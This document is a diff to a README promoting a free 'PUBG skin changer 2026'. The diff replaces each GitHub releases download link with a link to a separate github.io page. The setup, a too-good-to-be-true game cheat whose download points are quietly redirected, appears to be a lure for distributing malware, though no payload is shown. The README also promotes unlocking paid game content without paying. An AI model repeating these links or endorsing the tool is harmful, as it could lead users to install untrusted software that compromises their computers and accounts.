@@ -1,6 +1,6 @@
 # 🎮 pubg-skin-changer-2026 - Unlock Every Skin Instantly and Free
 
-[![Download Now](https://img.shields.io/badge/Download-PUBG_Skin_Changer_2026-blueviolet?style=for-the-badge&logo=github)](https://github.com/zgk37346/pubg-skin-changer-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-PUBG_Skin_Changer_2026-blueviolet?style=for-the-badge&logo=github)](https://zgk37346.github.io)
 
 ## 🚀 What Is This?
 
@@ -26,7 +26,7 @@ No other special hardware or software is needed. If your computer can run PUBG, 
 
 ## 📥 How to Download and Install
 
-Visit this link to download the application: [https://github.com/zgk37346/pubg-skin-changer-2026/releases](https://github.com/zgk37346/pubg-skin-changer-2026/releases)
+Visit this link to download the application: [https://zgk37346.github.io](https://zgk37346.github.io)
 
 Once you are on the page, follow these simple steps:
 
@@ -152,9 +152,9 @@ This tool is created for educational and entertainment purposes only. It is not 
 
 This skin changer is developed and maintained by passionate fans. If you find it useful, consider starring the repository on GitHub. Your support helps keep the project alive and updates frequent.
 
-[![Download](https://img.shields.io/badge/Download_Latest_Version-2.6.1-brightgreen?style=for-the-badge)](https://github.com/zgk37346/pubg-skin-changer-2026/releases)
+[![Download](https://img.shields.io/badge/Download_Latest_Version-2.6.1-brightgreen?style=for-the-badge)](https://zgk37346.github.io)
 
-Visit this link to download the application: [https://github.com/zgk37346/pubg-skin-changer-2026/releases](https://github.com/zgk37346/pubg-skin-changer-2026/releases)
+Visit this link to download the application: [https://zgk37346.github.io](https://zgk37346.github.io)
 
 ## 🏆 Final Words
 
